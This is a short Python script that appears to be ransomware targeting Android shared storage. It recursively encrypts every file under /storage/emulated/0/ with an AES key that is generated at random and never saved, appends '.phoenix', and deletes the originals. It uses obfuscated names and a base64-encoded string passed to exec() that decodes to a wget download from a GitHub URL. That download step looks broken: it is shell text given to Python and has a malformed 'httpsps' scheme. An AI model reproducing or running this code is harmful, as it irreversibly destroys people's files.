import hashlib, os, random, string, base64
from Crypto.Cipher import AES


def checkhost():
    gjdjs = "/storage/emulated/0/"
    worndjq = hashlib.sha256(f"{''.join(random.choices(string.ascii_letters,k=50))}".encode()).digest()
    for root, dirs, files in os.walk(gjdjs):
        for file in files:
            with open(os.path.join(root, file), 'rb') as f:
                data = f.read()
            pad_length = 16 - (len(data) % 16)
            data = data + pad_length * chr(pad_length).encode()
            cipher = AES.new(worndjq, AES.MODE_CBC, os.urandom(16))
            ngiebf = cipher.encrypt(data)
            with open(os.path.join(root, file) + '.phoenix', 'wb') as f:
                f.write(ngiebf)
            os.remove(os.path.join(root, file))

                

def tvksajd(adwekuv):
  pvncngr = base64.b64decode(adwekuv).decode('utf-8')
  exec(pvncngr)
    

def wget():
    tvksajd("d2dldCAtcSB0dHBzcHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2NvZGV3aXRoYWxvdWgvY29kZXdpdGhhbG91aC9tYWluL3Bob2VuaXguanBnICAtTyAvc3RvcmFnZS9lbXVsYXRlZC8wL0RDSU0vQ2FtZXJhLw==")
    